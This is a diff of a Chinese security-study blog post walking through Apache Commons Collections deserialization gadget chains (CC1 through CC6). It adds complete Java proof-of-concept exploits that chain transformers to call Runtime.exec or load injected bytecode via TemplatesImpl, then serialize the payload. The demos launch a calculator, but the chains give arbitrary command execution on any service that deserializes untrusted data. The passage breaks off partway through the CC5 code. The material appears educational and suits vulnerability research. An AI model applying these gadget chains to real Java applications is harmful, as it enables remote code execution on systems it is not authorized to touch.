@@ -488,21 +488,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-21
+                    2023-03-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    7.9k
+                    11.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    34 分
+                    50 分
                 </div>
                 
 
@@ -774,7 +774,7 @@ chainedTransformer.transform(Runtime.class);</code></pre>
 <p>也就是假设我们将Transformer数组的第一位加上new ConstantTransformer(Runtime.class)，也就相当于我们给ConstantTransformer返回的iConstant值设置为了Runtime.class</p>
 <p>那么在执行到TransformedMap里的checkSetValue时，第一次的chainedTransformer.transform调用的是ConstantTransformer的transform，返回的内容是固定的Runtime.class，实质上就是相当于将第二次调用transform的value赋值成了Runtime.class，满足了我们想要的chainedTransformer.transform(Runtime.class)</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319231640825.png" alt="image-20230319231640825"></p>
-<p>完整的exp为</p>
+<p>完整的poc为</p>
 <pre class="language-java" data-language="java"><code class="language-java">package org.example;
 
 import org.apache.commons.collections.Transformer;
@@ -834,10 +834,10 @@ public class Main &#123;
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>入口类是AnnotationinvocationHandler</p>
 <p>执行类是InvokerTransformer </p>
 <p>利用链是</p>
-<p>AnnotationinvocationHandler -&gt; readObject</p>
-<p>AbstractInputCheckedMapDecorator.MapEntry -&gt; setValue</p>
-<p>TransformedMap -&gt; checkSetValue</p>
-<p>InvokerTransformer -&gt; transform</p>
+<p>AnnotationinvocationHandler.readObject</p>
+<p>AbstractInputCheckedMapDecorator.MapEntry.setValue</p>
+<p>TransformedMap.checkSetValue</p>
+<p>InvokerTransformer.transform</p>
 <p>使用到的工具类辅助利用链： </p>
 <p>ConstantTransformer</p>
 <p> ChainedTransformer</p>
@@ -898,7 +898,7 @@ Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new
 <pre class="language-java" data-language="java"><code class="language-java">Object invocationHandler &#x3D;  declaredConstructor.newInstance(Override.class, proxyMap);</code></pre>
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320170157464.png" alt="image-20230320170157464"></p>
-<p>完整的exp为</p>
+<p>完整的poc为</p>
 <pre class="language-java" data-language="java"><code class="language-java">package org.LazyMapSer;
 
 import org.apache.commons.collections.Transformer;
@@ -956,13 +956,13 @@ public class main &#123;
 <p>入口类是AnnotationinvocationHandler</p>
 <p>执行类是InvokerTransformer </p>
 <p>调用链是：</p>
-<p>AnnotationinvocationHandler -&gt; readObject</p>
+<p>AnnotationinvocationHandler.readObject</p>
 <p>​                memberValues.entrySet()</p>
-<p>AnnotationinvocationHandler  -&gt; invoke</p>
-<p>LazyMap -&gt; get</p>
+<p>AnnotationinvocationHandler.invoke</p>
+<p>LazyMap.get</p>
 <p>​                ChainedTransformer.transform()</p>
 <p>​                ConstantTransformer.transform()</p>
-<p>InvokerTransformer -&gt; transform</p>
+<p>InvokerTransformer.transform</p>
 <p>使用到的工具类辅助利用链： </p>
 <p>ConstantTransformer</p>
 <p> ChainedTransformer</p>
@@ -974,7 +974,7 @@ public class main &#123;
 <p>TiredMapEntry类官方的介绍是这可用于使映射条目能够在基础映射上进行更改，没太看懂，但是具体的效果是把输入的Map对象和Object对象以key=value的形式输出出来，Object对象是key。</p>
 </blockquote>
 <p>对LazyMap类中的get方法选择的不同的函数造成了CC1的另一条LazyMap链</p>
-<p>在TiredMapEntry中也有一个调用get的方法</p>
+<p>在TiredMapEntry中也有一个调用get的方法，这条链被叫做CC6</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320180756995.png" alt="image-20230320180756995"></p>
 <p>恰好这个map和key也是在构造函数里赋值的，是我们可以控制的</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320180837381.png" alt="image-20230320180837381"></p>
@@ -1000,7 +1000,7 @@ public class main &#123;
 <p>在HashMap重写的readObject里调用了hash函数，而hash函数里就调用了hashCode方法</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320181622385.png" alt="image-20230320181622385"></p>
 <p>假设此时的key是tiedMapEntry，整个链子就能成功执行了</p>
-<p>按照我们的想法，这个exp该这么构造</p>
+<p>按照我们的想法，这个poc该这么构造</p>
 <pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;
         new ConstantTransformer(Runtime.class),
         new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
@@ -1075,7 +1075,7 @@ public class HashMapTest &#123;
         &#125;;
         ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
         HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
-        objectObjectHashMap.put(&quot;111&quot;,&quot;222&quot;);
+&#x2F;&#x2F;        objectObjectHashMap.put(&quot;111&quot;,&quot;222&quot;);
 
         Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(1));
         TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);
@@ -1179,7 +1179,7 @@ templates.newTransformer();</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321222918052.png" alt="image-20230321222918052"></p>
 <p>在TemlatesImpl的defineTransletClasses方法里，第422行</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321223042602.png" alt="image-20230321223042602"></p>
-<p>搭个断点能看出来因为不满足if判断，进入了else中，然后又因为_auxClasses的值为空，导致的空指针异常</p>
+<p>下个断点能看出来因为不满足if判断，进入了else中，然后又因为_auxClasses的值为空，导致的空指针异常</p>
 <p>但是这里我们要选让程序满足if判断的方式，而不是给_auxClasses赋值，因为在下面还有一个对_transletIndex的判断（两个都改了也能弹计算器，而且感觉更简单一点</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321224210163.png" alt="image-20230321224210163"></p>
 <p>接下来说一下满足if判断的方式</p>
@@ -1191,7 +1191,7 @@ templates.newTransformer();</code></pre>
 <p>改完后重新编译一下</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321225547734.png" alt="image-20230321225547734"></p>
 <h2 id="CC1的利用"><a href="#CC1的利用" class="headerlink" title="CC1的利用"></a>CC1的利用</h2><p>现在确定只要调用newTransformer方法就可以加载恶意类</p>
-<p>那我们还记得在cc1里InvokerTransformer.transform可以反射的方式去调用一些其他的方法</p>
+<p>那我们还记得在cc1里InvokerTransformer.transform可以以反射的方式去调用一些其他的方法</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319191708721.png" alt="image-20230319191708721"></p>
 <p>所以这里我们以反射调用newTransformer不就行了吗</p>
 <p>这里我们改一改CC1的Transformer数组</p>
@@ -1204,9 +1204,420 @@ templates.newTransformer();</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321231854359.png" alt="image-20230321231854359"></p>
 <h2 id="CC6的利用"><a href="#CC6的利用" class="headerlink" title="CC6的利用"></a>CC6的利用</h2><p>既然CC1可以，那CC6自然也可以，改的地方也一样，其余部分不动</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321232250015.png" alt="image-20230321232250015"></p>
-<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>这里这个TrAXFilter类的构造函数里调用了newTransformer方法</p>
+<h2 id="CC3调用链"><a href="#CC3调用链" class="headerlink" title="CC3调用链"></a>CC3调用链</h2><p>好了，这里回到CC3</p>
+<p>这里CC3的作者找到了一个TrAXFilter类</p>
+<p>其中的构造函数里调用了newTransformer方法，templates也是可控的</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321230200262.png" alt="image-20230321230200262"></p>
-<p>但是这个TrAXFilter类没有实现Serializable接口，所以就不能进行序列化操作。但是就像Runtime也不能进行序列化操作一样，我们可以利用反射把这个传过去</p>
+<p>但是这个TrAXFilter类没有实现Serializable接口，所以就不能进行序列化操作。但是就像Runtime也不能进行序列化操作一样，我们可以利用反射把TrAXFilter.class这个可以序列化的传过去，然后找到有函数中调用了类似于c  =（a）.getConstructor(b)；c.newInstance(d)的语句，实现触发TrAXFilter构造函数的目的。</p>
+<p>还真就有这样一个类里调用了这种语句</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322152401936.png" alt="image-20230322152401936"></p>
+<p>InstantiateTransformer类的transform函数，而且恰巧这些参数我们都能控制。</p>
+<p>所以加上这两句</p>
+<pre class="language-java" data-language="java"><code class="language-java">InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);
+instantiateTransformer.transform(TrAXFilter.class);</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322153150446.png" alt="image-20230322153150446"></p>
+<p>接下来就是找怎么去调用InstantiateTransformer的transform函数</p>
+<p>其实还是CC1里的东西，既然CC1里可以调InvokerTransformer.transform，那也就可以调InstantiateTransformer.transform</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322153557923.png" alt="image-20230322153557923"></p>
+<p>调用成功</p>
+<p>这里的Transformer[]一定要改为下面这个</p>
+<pre class="language-none"><code class="language-none">Transformer[] t &#x3D; new Transformer[]&#123;
+        new ConstantTransformer(TrAXFilter.class),
+        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)
+&#125;;</code></pre>
+
+<p>如果只用 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})，会由于CC1的transform参数不可控不能构造成InstantiateTransformer.transform(TrAXFilter.class)，导致无法在反序列化时有实例化的TrAXFilter类</p>
+<p>完整poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class cc3 &#123;
+    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;
+        TemplatesImpl templates &#x3D; new TemplatesImpl();
+        &#x2F;&#x2F; _name赋值不为null
+        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;123&quot;);
+        &#x2F;&#x2F; _class赋值为null
+        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);
+        classField.setAccessible(true);
+        classField.set(templates,null);
+        &#x2F;&#x2F;加载恶意类的字节码
+        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));
+        &#x2F;&#x2F;转为二维数组
+        byte[][] codes &#x3D; &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        &#x2F;&#x2F;_tfactory赋值
+        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+		InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);
+&#x2F;&#x2F;        instantiateTransformer.transform(TrAXFilter.class);
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        HashMap map &#x3D; new HashMap();
+        map.put(&quot;value&quot;,&quot;value&quot;);
+
+        Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer);
+&#x2F;&#x2F;
+        &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象
+        Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        &#x2F;&#x2F;获取构造方法
+        Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate);
+        ser(o);
+        unser();
+
+
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>对于CC3</p>
+<p>入口类是AnnotationinvocationHandler</p>
+<p>执行类是TemplatesImpl</p>
+<p>利用链是</p>
+<p>AnnotationinvocationHandler.readObject</p>
+<p>AbstractInputCheckedMapDecorator.setValue</p>
+<p>Transformed.checkSetValue</p>
+<p>ChainedTransformer.transform</p>
+<p>ConstantTransformer.transform</p>
+<p>InstantiateTransformer.transform</p>
+<p>TrAXFilter</p>
+<p>TransformerImpl.newTransformer</p>
+<p>TransformerImpl.getTransletInstance</p>
+<p>TransformerImpl.defineTransletClasses</p>
+<p>TransformerImpl.defineClass</p>
+<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>CommonsCollections4.0</strong></p>
+<p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p>
+<p>4.1版本：</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323203633151.png" alt="image-20230323203633151"></p>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>CC2和CC1一样，最后的都是到InvokerTransformer.transform方法</p>
+<p>所以前边这部分是一样的</p>
+<pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)
+&#125;;
+ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);</code></pre>
+
+<p>接下来去找哪调用了transform方法</p>
+<p>这里调了TransformingComparator的compare方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323205535754.png" alt="image-20230323205535754"></p>
+<p>这个transformer是可控的，构造函数里可以直接传</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323205601567.png" alt="image-20230323205601567"></p>
+<p>然后去找一下哪里调了compare</p>
+<p>在PriorityQueue类的siftDownUsingComparator方法里</p>
+<p>这个虽然是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323210141383.png" alt="image-20230323210141383"></p>
+<p>不过这里有两个if判断</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211613218.png" alt="image-20230323211613218"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211623496.png" alt="image-20230323211623496"></p>
+<p>第一个if需要(size&gt;&gt;&gt;1)-1&gt;=0，为2就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323211825789.png" alt="image-20230323211825789"></p>
+<p>然后这里调两次add，就可以实现让size为2的目的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323212049514.png" alt="image-20230323212049514"></p>
+<p>这个comparator也可以控制，也是我们必须要写的参数，所以第二个if可以忽略了，（TransformingComparator实现了Comparator接口，所以这里边可以写TransformingComparator</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323210546768.png" alt="image-20230323210546768"></p>
+<p>这里可以先写个poc了</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class cc2 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);
+        priorityQueue.add(1);
+        priorityQueue.add(1);
+        ser(priorityQueue);
+&#x2F;&#x2F;        unser();
+
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+<h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><p>但是这里序列化的时候也弹计算器了，原因就是在第二次add的时候，不满足if判断进了siftUp里，然后在siftUp里也有个siftDownUsingComparator，导致提前执行了命令</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323212731526.png" alt="image-20230323212731526"></p>
+<p>这里就要用我们熟悉的反射了</p>
+<p>最终poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">package org.cc2;
+
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class cc2 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;&quot;cmd&quot;,&quot;&#x2F;c&quot;,&quot;calc&quot;&#125;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);
+        Class aClass &#x3D; priorityQueue.getClass();
+        Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(priorityQueue,2);
+&#x2F;&#x2F;        priorityQueue.add(1);
+&#x2F;&#x2F;        priorityQueue.add(1);
+        ser(priorityQueue);
+&#x2F;&#x2F;        unser();
+
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+<p>这里计算器会弹两次，因为compare里调了两次transform</p>
+<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>cc2的链挺短的，也挺简单</p>
+<p>执行类是InvokerTransformer </p>
+<p>入口类是PriorityQueue</p>
+<p>调用链是</p>
+<p>PriorityQueue.readObject</p>
+<p>PriorityQueue.siftDownUsingComparator</p>
+<p>TransformingComparator.compare</p>
+<p>InvokerTransformer.transform</p>
+<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>cc4像是cc2和cc3的缝合品</p>
+<p>使用了cc3的加载字节码的执行方式，但是前半部分用了cc2的链子</p>
+<p>所以这里不分析了，简单写一下调用链</p>
+<h2 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h2><p>PriorityQueue.readObject</p>
+<p>PriorityQueue.siftDownUsingComparator</p>
+<p>TransformingComparator.compare</p>
+<p>ChainedTransformer.transform</p>
+<p>ConstantTransformer.transform</p>
+<p>InstantiateTransformer.transform</p>
+<p>TrAXFilter</p>
+<p>TransformerImpl.newTransformer</p>
+<p>TransformerImpl.getTransletInstance</p>
+<p>TransformerImpl.defineTransletClasses</p>
+<p>TransformerImpl.defineClass</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323214856492.png" alt="image-20230323214856492"></p>
+<p>poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">package org.cc4;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class cc4 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+        TemplatesImpl templates &#x3D; new TemplatesImpl();
+        &#x2F;&#x2F; _name赋值不为null
+        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;123&quot;);
+        &#x2F;&#x2F; _class赋值为null
+        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);
+        classField.setAccessible(true);
+        classField.set(templates,null);
+        &#x2F;&#x2F;加载恶意类的字节码
+        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));
+        &#x2F;&#x2F;转为二维数组
+        byte[][] codes &#x3D; &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        &#x2F;&#x2F;_tfactory赋值
+        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        TransformingComparator transformingComparator&#x3D;new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(2, transformingComparator);
+        Class aClass &#x3D; priorityQueue.getClass();
+        Field size &#x3D; aClass.getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(priorityQueue,2);
+        ser(priorityQueue);
+        unser();
+
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
+        oi.readObject();
+    &#125;
+&#125;</code></pre>
+
+<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5的环境又回到了CommonsCollections3</p>
+<p>CommonsCollections1和CommonsCollections3因为AnnotaionInvocationHandler入口在jdk8中代码被修改了导致不能使用，所以CommonsCollections5换了一个入口，在调用链的构造中，也新加了一个TiedMapEntry作为中转。</p>
+<h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>CC5的后半段就是从LazyMap.get到InvokerTransformer.transform</p>
+<p>这里和LazyMap链一样就不细说了，这里就说说前半段，要找到调用get方法的类，在CC6里我们用的是TiredMapEntry类的getValue方法，在CC5里也是它，但是在CC6里用的是它的hashCode</p>
+<p>方法来调用getValue方法，而在CC5里用的是它的toString方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323220204497.png" alt="image-20230323220204497"></p>
+<p>然后就去找有没有调用toString的（这个可太多了</p>
+<p>在CC5里找的是BadAttributeValueExpException类的readObject方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323220540847.png" alt="image-20230323220540847"></p>
+<p>这里简单说一下readObject里的内容，要想到toString，就要满足两个if判断，首先val不为空，其次判断valObj是否是String类的实例或者是子类实例，如果都不满足，就进入最后一个elseif里调用valObj.toString，所以这里让valObj为TiredMapEntry类的就行了，这个在实例化的时候可以赋值</p>
+<p>理想poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class cc5 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();
+        Transformer[] t &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);
+        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);
+        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);
+
+        BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(tiedMapEntry);
+        ser(badAttributeValueExpException);
+        unser();
+    &#125;
+    public static void ser(Object obj) throws IOException &#123;
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));
+        oos.writeObject(obj);
+    &#125;
+    public static void unser() throws IOException, ClassNotFoundException &#123;
